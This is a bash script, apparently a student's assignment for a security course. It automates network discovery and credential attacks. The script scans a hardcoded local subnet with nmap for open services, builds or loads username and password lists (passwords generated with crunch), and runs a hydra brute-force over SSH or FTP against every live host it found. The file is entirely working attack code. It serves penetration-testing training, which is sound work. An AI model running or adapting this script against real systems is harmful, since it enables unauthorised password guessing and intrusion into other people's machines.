#!/bin/bash

#Student name: Ivan Lim Yee Hui
#Student code: S11
#Lecturer's name: Kar Wei

touch vulnerreport #to create a report file
curtime=$(TZ=Asia/Singapore date) #to set current date and time in SG format to a variable
curip=$(ifconfig | grep inet | grep broadcast | awk '{print $2}') #store the IP of device into a variable to be called
echo [*] $curtime Current device IP: >> vulnerreport #adding descriptions of actions into report
echo $curip >> vulnerreport #add IP found previously into report
curiprng=$(netmask -c $curip) #checking the netmask of IP and storing in a vairable
echo [*] $curtime Current LAN netmask: >> vulnerreport #adding descriptions of actions into report
echo $curiprng >> vulnerreport #add netmask found previously into report

echo [*] $curtime Starting Nmap scan now...... >> vulnerreport #adding descriptions of actions into report
nmap 192.168.84.128/24 -p- -sV --open >> resultsnmap.txt #running nmap scan on the netmask on all ports, checking for service versions, showing only open ports and storing into another file
cat resultsnmap.txt | grep 'scan report' | awk '{print $NF}' >> iplist #printing the results of previous scan, catching the lines that show the IP of live devices and selecting the column with the IPaddress and storing it into a file
echo [*] $curtime These are the live hosts/devices >> vulnerreport #adding descriptions of actions into report
cat iplist >> vulnerreport #adding list of live devices into the report
cat resultsnmap.txt >> vulnerreport #adding results of scan into report

echo [*] $curtime Scan completed ~ #inform user that scan is completed
echo [*] $curtime Next, we will be getting ready to bruteforce the found devices #inform user that next on script is to bruteforce
echo [*] Would you like to use an existing user list or create a new user list? #asking the user to choose
echo [*] Key 1 for existing user list 2 for creating a new list #asking user to choose
read choice #collect user input and store in variable

if [ $choice == 1 ] #if statement to check if user input is 1
then
	echo [*] Please input the user list that you would like to use: #if user input is 1, ask user to input the name of user list to use
	read usrlst	#catch user input
elif [ $choice == 2 ] #check if user input is 2
then
	echo [*] How many users would you like to add into this list? #if user input is 2, ask user the number of usernames he would like to add to the list
	read usrnum #gather user input
	sTart=1 #store a minimum number of users to add
	echo [*] What would you like to name this list? #ask user to name the list that will be used later
	read usrlst #gather user input
	i=$sTart #storing the min number into another variable, not sure if necessary
	while [[ $i -le $usrnum ]] #while condition to check if the base number is lesser or equals to the user input
	do
		echo [*] Please key in the username "($i done)": #asking user to key the username to be added and showing the number of usernames added
		read usrnam #gather userinput
		echo $usrnam >> $usrlst # adding user input into the filename user specified earlier
		((i = i + 1)) #adding 1 to the minimum number after completing steps above so that it will break the while condition
	done
else
	echo [*] You have keyed a wrong selection. Exiting now... #if user did not key either 1 or 2, exit 
fi

echo [*] Would you like to use an existing password list or create a new password list? #ask user to choose
echo [*] Key 1 for existing list 2 for creating a new list #ask user to choose
read pwchoice # gather user input

if [ $pwchoice == 1 ] #if user input is 1
then
	echo [*] Please input the password list that you would like to use: #if user input is 1, ask user to key filename to use
	read pwlst #gather user input
elif [ $pwchoice == 2 ] #check if user input is 2
then
	echo [*] What would you like to name this list? #if user input is 2, ask user to name the file
	read pwlst #gather user input
	echo [*] Enter the format that you would like to crunch #ask user for the format for the command crunch to create a password list
	read crhformat # gather user input
	crunch $crhformat >> $pwlst # use user input to crunch a password list and storing the list into the file named by user
else
	echo [*] You have keyed a wrong selection. Exiting now... #if user did not input 1 or 2, exit
fi


svctobf=$(cat "resultsnmap.txt" | grep -E 'ssh|ftp' | awk '{print $3}' | head -n1)  #printing scan results, catching the different login services selecting the column with the name of the service, and catching only the 1st service
echo [*] $curtime Starting HYDRA BruteForce via $svctobf... >>  vulnerreport #adding descriptions of actions into report
hydra -L $usrlst -P $pwlst -M iplist $svctobf -T 30 -vv >> vulnerreport #using hydra to bruteforce with user specified username list and password list, list of ipaddress gathered from scan earlier, and name of open service and storing results into report
